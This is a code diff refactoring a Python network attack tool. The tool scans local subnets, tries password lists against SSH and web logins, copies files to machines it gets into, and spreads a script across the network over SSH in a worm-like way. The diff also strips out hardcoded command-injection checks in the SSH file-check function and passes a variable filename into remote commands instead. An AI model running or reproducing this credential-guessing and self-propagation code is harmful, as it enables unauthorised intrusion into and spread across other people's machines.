@@ -15,6 +15,8 @@ from scapy.utils import subprocess, os
 # from scapy.all import *
 # Importing sleep to allow network processes time to complete.
 from time import sleep
+# Importing file to work with files natively.
+import file
 # Importing logging to safely log sensitive, error or debug info.
 import logging
 # Importing pipes for the piping for certain processes
@@ -27,34 +29,22 @@ import strings
 import strings_functions
 
 
-def additional_actions(arguments, ip, port, username,
-                       transfer_file_filename):
+def additional_actions(transfer_file, propagation_script, arguments, ip, port,
+                       username):
     """
     This function passes the appropriate arguments to and runs the transferring
     file and propagating functions, these functions contain the check to stop
     them from being run if the appropriate arguments aren't used
+    :param transfer_file: The file that will be transferred upon user request
+    :param propagation_script: The script that will be propagated upon user
+    request
     :param arguments: Arguments passed in by the user themselves
     :param ip: The ip address we are transferring the file to
     :param port: The port we are transferring the file through
     :param username: The username for the transfer action
-    :param transfer_file_filename: Filename for the file to be transferred
     """
-    transferring_file(arguments, ip, port, username,
-                      transfer_file_filename)
-    propagating(arguments, ip, port, username)
-
-
-def append_lines_from_file_to_list(file):
-    """
-    This function will read a file and return the lines (minus the newline
-    character) as a list
-    :param file: The file to read and gather lines from
-    :return lines_list: The lines themselves.
-    """
-    lines_list = []
-    for line in file:
-        lines_list.append(line.rstrip())
-    return lines_list
+    transfer_file.check_transfer_file(arguments, ip, port, username)
+    propagating(propagation_script, arguments, ip, port, username)
 
 
 def assigning_values(arguments):
@@ -79,7 +69,8 @@ def assigning_values(arguments):
         except RuntimeError:
             logging.error(strings.IP_FILENAME_NOT_FOUND)
             return None
-        ip_list = convert_file_to_list(ip_addresses_filename)
+        ip_address_file = file.File(ip_addresses_filename)
+        ip_list = ip_address_file.convert_file_to_list()
         if ip_list is None:
             return None
     try:
@@ -100,12 +91,12 @@ def assigning_values(arguments):
         return None
 
 
-def check_over_ssh(ip, port, username, password):
+def check_over_ssh(filename, ip, port, username, password):
     """
-    This function checks if the net_propagation.py script is already located at
-    the target machine over SSH. If it is then false is returned and if not
-    then true is returned. This is needed as a prerequisite to propagating over
-    SSH
+    This function checks if a given file is already located at the target
+    machine over SSH. If it is then false is returned and if not then true is
+    returned. This is needed as a prerequisite to propagating over SSH
+    :param filename: The filename that we are checking for, can contain a path
     :param ip: The IP address target for SSH
     :param port: The port on which we're running SSH
     :param username: The username to target over SSH
@@ -119,23 +110,13 @@ def check_over_ssh(ip, port, username, password):
         client.set_missing_host_key_policy(RejectPolicy)
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
-        # Hardcoded checks to avoid injection
-        if strings_functions.touch_file(strings.DEMO_SCRIPT_FILENAME) == \
-                "touch demo.py":
-            client.exec_command(pipes.quote(strings_functions.
-                                            touch_file(strings.
-                                                       DEMO_SCRIPT_FILENAME)))
-        else:
-            logging.error(strings.SANITATION_FAILED)
+        client.exec_command(pipes.quote(strings_functions.touch_file(
+            filename)))
+
+        if str(client.exec_command(pipes.quote(strings_functions.cat_file(
+                filename)))[1]).__len__() < 1:
             client.close()
-            return False
-        # Hardcoded checks to avoid injection
-        if strings_functions.cat_file(strings.DEMO_SCRIPT_FILENAME) == \
-                "cat demo.py":
-            if str(client.exec_command(pipes.quote(strings_functions.cat_file(
-                    strings.DEMO_SCRIPT_FILENAME)))[1]).__len__() < 1:
-                client.close()
-                return True
+            return True
 
         logging.error(strings.SANITATION_FAILED)
         client.close()
@@ -247,23 +228,6 @@ def connect_web(ip, port, username, password):
     return attempt_succeeded
 
 
-def convert_file_to_list(filename):
-    """
-    This function will convert a given file specified by a filename to a list
-    and will then proceed to return that list
-    :param filename: The filename of the file that needs to be converted to a
-    list
-    :return file_as_list: The list of the lines from the file
-    """
-    try:
-        with open(filename) as file:
-            file_as_list = append_lines_from_file_to_list(file)
-        return file_as_list
-    except FileNotFoundError:
-        logging.error(strings.FILE_DOES_NOT_EXIST)
-        return None
-
-
 def cycle_through_subnet(ip_list, interface):
     """
     This function takes in a given network interface and an IP list, it will
@@ -292,25 +256,12 @@ def cycle_through_subnet(ip_list, interface):
     return ip_list
 
 
-def file_error_handler():
+def exit_and_show_instructions():
     """
-    This function handles errors related to the processing of files.
+    This function will print the help screen and show an exit prompt.
     """
-    print(strings.FILENAME_PROCESSING_ERROR)
-    exit_and_show_instructions()
-
-
-def file_not_exist(ip, port, username, password):
-    """
-    This function will check whether network_attack.py exists on a target
-    machine and how it does that is dependent on the port being passed in
-    :param ip: IP of the machine we're checking for a file for
-    :param port: Port on which we which to check the machine
-    :param username: Username to use as part of checking the file
-    :param password: Password being used as part of checking the file
-    :return check_over_ssh(ip, port, username, password):
-    """
-    return check_over_ssh(ip, port, username, password)
+    print(strings_functions.help_output())
+    print(strings.EXITING)
 
 
 def gathering_local_ips(ip_list):
@@ -330,14 +281,6 @@ def gathering_local_ips(ip_list):
                 interface))
             ip_list = (cycle_through_subnet(ip_list, interface))
     return ip_list
-
-
-def exit_and_show_instructions():
-    """
-    This function will print the help screen and show an exit prompt.
-    """
-    print(strings_functions.help_output())
-    print(strings.EXITING)
 
 
 def is_reachable_ip(ip):
@@ -365,14 +308,15 @@ def is_reachable_ip(ip):
     return False
 
 
-def propagate_script(ip, port, login_string):
+def propagate_script(script, ip, port, login_string):
     """
-    This function is responsible for propagating the network_attack.py to a
+    This function is responsible for propagating a given script to a
     previously accessed machine. It will only run when the user specifies
     using the appropriate argument and when the port being used is 22 (SSH),
     it will also check to ensure the script isn't  already present on the
     target. It goes about propagating the script in different ways depending on
     if an SSH port is specified
+    :param script: The script to be propagated and ran on another machine
     :param ip: The IP address we wish to propagate the script to
     :param port: The port through which we'll propagate the script
     :param login_string: This string contains the username and password for the
@@ -382,8 +326,8 @@ def propagate_script(ip, port, login_string):
     """
     login_string_split = login_string.split(strings.COLON)
     try:
-        if file_not_exist(ip, port, login_string_split[0],
-                          login_string_split[1]):
+        if script.file_not_exist(ip, port, login_string_split[0],
+                                 login_string_split[1]):
             print(strings.RSA_AND_PROMPT)
             os.system(strings_functions.scp_command_string(port,
                                                            login_string_split[
@@ -425,6 +369,30 @@ def propagate_script(ip, port, login_string):
             return False
     except RuntimeError:
         return False
+
+
+def propagating(script, arguments, ip, port, login_details):
+    """
+    This function attempts propagation of a given script over the network.
+    If it succeeds we alert the user and let them know what service was
+    successful. If it is unsuccessful then we let the user know it was
+    unsuccessful and over what service. Should the user have never asked for
+    the script to be propagated over the network then we let them know this
+    part of the process will not be done
+    :param script: The script that needs to be propagated and spread
+    :param arguments: The arguments passed in by the user themselves
+    :param ip: The IP address we wish to propagate to
+    :param port: The port we're propagating through
+    :param login_details: The username and password string combo
+    """
+    if strings.ARGUMENT_PROPAGATE in arguments and (port == strings.SSH_PORT):
+        propagated = propagate_script(script, ip, port, login_details)
+        if propagated:
+            logging.info(strings.SCRIPT_PROPAGATED)
+        else:
+            logging.debug(strings.SCRIPT_NOT_PROPAGATED)
+    else:
+        logging.info(strings.DO_NOT_PROPAGATE)
 
 
 def remove_unreachable_ips(ip_list):
@@ -507,34 +475,8 @@ def sign_in_service(ip, port, username, password_list):
     return None
 
 
-def transfer_file(ip, port, login_string, transfer_file_filename):
-    """
-    This function will transfer a given file if the end user has provided the
-    appropriate argument, and only when machine login details are found for
-    either tenet or SSH. It handles the transfer of this file differently
-    depending on whether the port value given is an SSH port
-    :param ip: The IP address to which the file should be transferred
-    :param port: The port over which the file should be transferred
-    :param login_string: The username and password needed for the transfer of
-    the file over the given service
-    :param transfer_file_filename: The filename of the file to be transferred
-    :return True: The transfer of the file is a success
-    :return False: The transfer of the file is unsuccessful
-    """
-    login_string_split = login_string.split(strings.COLON)
-    try:
-        print(strings.RSA_AND_PROMPT)
-        os.system(strings_functions.scp_command_string(port,
-                                                       login_string_split[0],
-                                                       ip,
-                                                       transfer_file_filename))
-        return True
-    except ConnectionRefusedError:
-        return False
-
-
 def try_action(ip, port, target_username, password_list,
-               transfer_file_filename, arguments):
+               transfer_file_filename, propagation_script, arguments):
     """
     This function will attempt a sign in action across various services
     depending on the ip or port supplied (if the port is open on that IP), it
@@ -547,6 +489,7 @@ def try_action(ip, port, target_username, password_list,
     :param target_username: The username for the action
     :param password_list: A list of possible passwords
     :param transfer_file_filename: A filename for file to transfer
+    :param propagation_script: A script name for a script to transfer
     :param arguments: List of user specified arguments
     """
     if scan_port(ip, port):
@@ -554,41 +497,10 @@ def try_action(ip, port, target_username, password_list,
         action_login_details = try_sign_in(ip, port, target_username,
                                            password_list)
         if action_login_details[0]:
-            additional_actions(arguments, ip, port,
-                               action_login_details[0],
-                               transfer_file_filename)
+            additional_actions(transfer_file_filename, propagation_script,
+                               arguments, ip, port, action_login_details[0])
     else:
         logging.debug(strings.CLOSED_IP_PORT_PAIR)
-
-
-def try_sign_in(ip, port, target_username, password_list):
-    """
-    This function will try to sign in to a specific service depending on the
-    port supplied. If it gets a successful login then it will return the login
-    details and the service used, otherwise it returns none as the login
-    details along with the service used
-    :param ip: Target IP address for an action
-    :param port: Target port over which to carry out an action
-    :param target_username: Target username that's needed for the action
-    :param password_list: Target password that's needed for the action
-    :return str(sign_in_details), service: The username and password of a
-    successful action with the service used
-    :return None, service: Empty username and password for an unsuccessful
-    action and the service which was used.
-    """
-    service_switch = {
-        strings.SSH_PORT: strings.SSH_LOWERCASE,
-        strings.WEB_PORT_EIGHTY: strings.WEB_LOGIN,
-        strings.WEB_PORT_EIGHTY_EIGHTY: strings.WEB_LOGIN,
-        strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: strings.WEB_LOGIN
-    }
-    service = service_switch.get(str(port))
-    sign_in_details = sign_in_service(ip, port, target_username, password_list)
-    if sign_in_details:
-        logging.info(strings_functions.working_username_password(service))
-        return str(sign_in_details), service
-    logging.debug(strings.IMPOSSIBLE_ACTION)
-    return None, service
 
 
 def try_password_for_service(ip, port, username, password):
@@ -625,63 +537,31 @@ def try_password_for_service(ip, port, username, password):
         return False
 
 
-def propagating(arguments, ip, port, login_details):
+def try_sign_in(ip, port, target_username, password_list):
     """
-    This function attempts propagation of the network_propagation.py script
-    over the network. If it succeeds we alert the user and let them know what
-    service was successful. If it is unsuccessful then we let the user know it
-    was unsuccessful and over what service. Should the user have never asked
-    for the script to be propagated over the network then we let them know this
-    part of the process will not be done
-    :param arguments: The arguments passed in by the user themselves
-    :param ip: The IP address we wish to propagate to
-    :param port: The port we're propagating through
-    :param login_details: The username and password string combo
+    This function will try to sign in to a specific service depending on the
+    port supplied. If it gets a successful login then it will return the login
+    details and the service used, otherwise it returns none as the login
+    details along with the service used
+    :param ip: Target IP address for an action
+    :param port: Target port over which to carry out an action
+    :param target_username: Target username that's needed for the action
+    :param password_list: Target password that's needed for the action
+    :return str(sign_in_details), service: The username and password of a
+    successful action with the service used
+    :return None, service: Empty username and password for an unsuccessful
+    action and the service which was used.
     """
-    if strings.ARGUMENT_PROPAGATE in arguments and (port == strings.SSH_PORT):
-        propagated = propagate_script(ip, port, login_details)
-        if propagated:
-            logging.info(strings.SCRIPT_PROPAGATED)
-        else:
-            logging.debug(strings.SCRIPT_NOT_PROPAGATED)
-    else:
-        logging.info(strings.DO_NOT_PROPAGATE)
-
-
-def transferring_file(arguments, ip, port, login_details,
-                      transfer_file_filename):
-    """
-    This function attempts transferring a user specified file across the
-    network. If it succeeds we alert the user and let them know transferring
-    the file was a success and over what service. If it is unsuccessful then we
-    let the user know it was unsuccessful and over what service. Should the
-    user have never asked for a file to be transferred over the network then we
-    let them know this process will not be done
-    :param arguments: The arguments passed in by the user themselves
-    :param ip: The IP address we wish to propagate to
-    :param port: The port we're propagating through
-    :param login_details: The username and password string combo
-    :param transfer_file_filename: The filename of the file we wish to transfer
-    """
-    if strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE in arguments and \
-            (str(port) == strings.SSH_PORT):
-        transferred = transfer_file(ip, port, login_details,
-                                    transfer_file_filename)
-        if transferred:
-            logging.info(strings.TRANSFER_SUCCESS_SSH)
-        else:
-            logging.debug(strings.TRANSFER_FAILURE_SSH)
-    else:
-        logging.info(strings.DO_NOT_TRANSFER)
-
-
-def validate_file_exists(filename):
-    """
-    This function checks if a file exists given a set filename and if it
-    doesn't we alert the user with an error, show the help screen and exit
-    gracefully
-    :param filename: The name of the file we wish to ensure exists
-    """
-    if not path.exists(filename):
-        logging.error(strings.FILE_DOES_NOT_EXIST)
-        exit_and_show_instructions()
+    service_switch = {
+        strings.SSH_PORT: strings.SSH_LOWERCASE,
+        strings.WEB_PORT_EIGHTY: strings.WEB_LOGIN,
+        strings.WEB_PORT_EIGHTY_EIGHTY: strings.WEB_LOGIN,
+        strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: strings.WEB_LOGIN
+    }
+    service = service_switch.get(str(port))
+    sign_in_details = sign_in_service(ip, port, target_username, password_list)
+    if sign_in_details:
+        logging.info(strings_functions.working_username_password(service))
+        return str(sign_in_details), service
+    logging.debug(strings.IMPOSSIBLE_ACTION)
+    return None, service
